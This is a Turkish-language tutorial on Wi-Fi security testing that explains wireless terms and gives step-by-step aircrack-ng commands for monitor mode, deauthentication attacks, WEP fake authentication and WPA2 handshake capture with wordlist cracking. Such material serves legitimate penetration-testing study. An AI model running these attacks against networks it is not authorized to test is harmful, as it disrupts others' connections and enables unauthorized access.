# Wi-Fi Hacking

## Temel Kavramlar

Wi-Fi ağlarının güvenliğini test etmek, çeşitli temel terimlerin anlaşılmasıyla başlar.

* **SSID:** Kablosuz ağın görünen adıdır.
* **ESSID:** Bir ağa atanan benzersiz tanımlayıcıdır.
* **BSSID:** Bir ağ cihazının (erişim noktası) **MAC adresini** temsil eder.
* **WPA2-PSK:** Parola gerektiren bir güvenlik protokolüdür.
* **WPA2-EAP:** Kullanıcı adı ve parola gerektiren, daha güvenli bir protokoldür.
* **RADIUS:** Kimlik doğrulama ve yetkilendirme hizmeti sunan bir protokoldür.
* **ENC:** Ağın kullandığı şifreleme türüdür (örn. WPA2).
* **CIPHER:** Şifreleme türünün kullandığı protokolü gösterir (örn. TKIP).
* **PWR:** Wi-Fi kartı tarafından ölçülen sinyal gücünü gösterir. Daha küçük bir değer, daha güçlü bir sinyale ve cihaza daha yakın olduğunuzu belirtir.
* **#Data:** Yakalanan veri paketlerinin sayısını gösterir.
* **Station:** Hedef ağa bağlı olan cihazların **MAC adreslerini** gösterir. Bu bilgi, saldırılarda hedef belirlemek için önemlidir.

---

## Kablosuz Ağları İzleme

Sızma testlerine başlamadan önce ağ kartını uygun moda almak ve çevredeki ağları izlemek gerekir.

* **`iwconfig`**: Sistemde bulunan tüm kablosuz ağ kartlarını listeler.
* **`airmon-ng start wlan0`**: `wlan0` adlı ağ kartını **monitör moduna** alır. Bu modda ağ kartı, ağlara bağlanamaz ancak pasif bir şekilde paketleri dinleyebilir. Monitör modundaki arayüz genellikle `wlan0mon` olarak adlandırılır.
* **`airmon-ng check kill`**: Ağ kartını kullanan diğer süreçleri sonlandırarak monitör moda geçişi kolaylaştırır.
* **`airodump-ng`**: Çevredeki kablosuz ağları ve bunlara bağlı cihazları tarar ve paket yakalar.

### `airodump-ng` Parametreleri

* `--bssid` veya `-b`: Hedef ağın BSSID'sini (MAC adresi) belirtir.
* `--channel` veya `-c`: Hedef ağın kanal numarasını belirtir.
* `--write` veya `-w`: Yakalanan paketleri bir dosyaya kaydetmek için kullanılır. Bu, parola kırma için gereklidir.
* **`WPA Handshake`**: Bir cihaz ağa bağlanırken gerçekleşen el sıkışma paketidir. Bu paketin içinde parola bilgisi bulunur ve yakalandığında parola kırma işlemi yapılabilir.

---

## Saldırı Yöntemleri ve Parola Kırma

### Deauthentication (Kimlik Doğrulamasını Kaldırma) Saldırısı

Bu saldırı, bir ağdaki cihazların bağlantısını keserek, tekrar bağlanmaları sırasında **WPA Handshake** paketini yakalamayı amaçlar.

1.  **Monitör Modu:** `airmon-ng start <arayüz>` komutuyla monitör moduna geçilir.
2.  **Ağ İzleme:** `airodump-ng <arayüz>` komutuyla çevredeki ağlar hakkında bilgi toplanır.
3.  **Hedefi Belirleme:** `airodump-ng --channel <kanal_no> --bssid <mac_adresi> <arayüz>` komutuyla sadece hedef ağ izlenir.
4.  **Saldırı:**
    * Tüm cihazların bağlantısını kesmek için: `aireplay-ng --deauth <paket_sayısı> -a <modem_mac_adresi> <arayüz>`
    * Belirli bir cihazın bağlantısını kesmek için: `aireplay-ng --deauth <paket_sayısı> -a <modem_mac_adresi> -c <cihaz_mac_adresi> <arayüz>`

### WEP ve WPA2 Parola Kırma

**WEP Parola Kırma:**
* `airodump-ng --channel <kanal> --bssid <mac> --write <dosya_adı> <arayüz>` komutuyla paketler yakalanır.
* `aircrack-ng <dosya_adı>` komutuyla yakalanan paketler kullanılarak parola kırılmaya çalışılır.
* Ağa bağlı bir cihaz yoksa, `aireplay-ng --fakeauth <paket_sayısı> -a <modem_ip_adresi> -h <mac_adresi> <arayüz>` komutuyla sahte bir yetkilendirme saldırısı yapılır.

**WPA2 Parola Kırma:**
1.  Ağ kartı monitör moduna alınır: `airmon-ng start wlan0`
2.  Çevredeki ağlar izlenir: `airodump-ng wlan0mon`
3.  Hedef ağa odaklanılır ve paketler dosyaya kaydedilir: `airodump-ng -c <kanal> --bssid <modem_mac> -w dosyaAdi wlan0mon`
4.  `Deauthentication` saldırısı yapılır ve WPA Handshake paketi yakalanır.
5.  `aircrack-ng -b <modem_bssid> -w <wordlist> <cap_dosyası>` komutuyla, bir wordlist kullanılarak parolanın **kaba kuvvet (`brute force`)** ile kırılması denenir.

---

## Önemli Notlar

* **Donanım:** Parola kırma işlemleri, işlemciden daha çok **ekran kartı (`GPU`)** gücüne ihtiyaç duyar.
* **Sanal Makine:** Sanal makine üzerinde bu işlemleri yapmak için, sanal makine programında USB ayarlarını yapılandırarak harici bir ağ kartı bağlamanız gerekir. Çoğu dizüstü bilgisayarın dahili ağ kartı monitör modunu desteklemez.